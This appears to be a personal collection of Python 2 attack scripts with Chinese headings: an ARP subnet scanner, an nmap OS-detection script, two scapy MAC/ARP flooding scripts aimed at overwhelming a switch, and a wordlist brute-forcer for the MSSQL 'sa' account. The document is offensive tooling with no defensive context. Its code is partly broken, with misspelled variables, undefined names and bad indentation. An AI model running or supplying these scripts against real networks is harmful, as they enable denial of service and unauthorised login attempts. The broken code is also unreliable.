arp扫描
#arpscan.py
from scapy.all import *
import sys,getopt
def usage():
     print 'Usage:sudo ./ArpScanner.py'
def main(argv):
     try:
          opts,args =getopt.getopt(argv,'')
     except getopt.GetoptError:
           usage()
           sys.exit(2)  
     for ips in range (1,254):
     ip='192.168.1.'+str(ips)
     arpPkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip,hwdst='ff:ff:ff:ff:ff:ff')
     res = srp1(arpRkt,timeout=1,verbose=0)
     if res:
          print 'IP:'+res.psrc+'MAC:'+res.hwsrc
if __name__ == '__main__':
     main(sys.argv[1:])
#!/usr/bin/env python
import nmap
import sys
###############

def main():
    if len(sys.argv) !=2:
        print 'Usage:python  %s  {IP} '%sys.argv[0]
        sys.exit()
    IP=sys.argv[1]
    print 'IP:%s for OS scanning ......'%IP
    nm=nmap.PortScanner()
    nm.scan(hosts=IP,arguments='-O')
    if nm.has_host(IP):
        result=nm[IP]['osmatch'][0]
        print result['name']
    else:
        print 'NO message'

##############
if __name__=="__main__":
    main()   

mac flood
#!/usr/bin/python
1、运行一次溢出几十个就没了
import sys
from scapy.all import *

packet = Ether(src=RandMAC("*:*:*:*:*:*"),
     dst=RandMAC("*:*:*:*:*:*")) / \
     IP(src=RandIP("*.*.*.*"),
     dst=RandIP("*.*.*.*")) / \
     ICMP()

if len(sys.argv) < 2:
     dev = "eth0"
else:
     dev = sys.argv[1]

print "Flooding net with random packets on dev " + dev

sendp(packet, iface=dev, loop=1)

2、运行一次，每秒100多个
from scapy.all import *
import threading

#循环发ARP包
def FB(x): 
    while 1:
    sendp(Ether(src=RandMAC(),dst="FF:FF:FF:FF:FF:FF")/ARP(op=2,psrc="0.0.0.0",hwdst="FF:FF:FF:FF:FF:FF")/Padding(load="X"*18))

#多线程
def DX(dx):
    for i in range(dx):
    s=threading.Thread(target=FB,args=(i,))
    s.start()

if __name__=="__main__":
    DX(10)
mssql暴力破解：
import mssql
import time
##########
def try_login(server,user,password):
    try:
        conn= mssql_connect(server=server,user=user,password=password)
        if conn.connected:
            conn.close()
            return True
        else:
            return False
    except:
        return False
##########
def get_wordlist_from_file(filename):
    with open(filename,'r')as f:
        w=f.readlines()
    return w
###############
#---------------
wfilename='wordlist.txt'
server='192.168.x.x'
user='sa'
#--------------
def main():
    print '+'+'-'*40+'+'
    print ''*10+'mssql brute script'
    print '+'+'-'*40+'+'
    print 'server:%s'%server
    print 'user:%s'%user
    print 'wordlist:%s'%wordname
    print '+'+'-'*40+'+'
    pass_list=get_wordlist_from_file(wfilename)
    if pass_list is None:
        print '[-] wordlist is empty .exit.'
        return
    for p in pass_list:
        p=p.strip('\n')
        if try_login(server,user,p):
            print '+'+'-'*40+'+'
            print '[+] burte success ,passwordis%s'%p
            print '+'+'-'*40+'+'
            break
        else:
            print '[-] attempt to login with password "%s" failed'%p
        time.sleep(0.1)
###############
if __name__=='__main__':
    main()
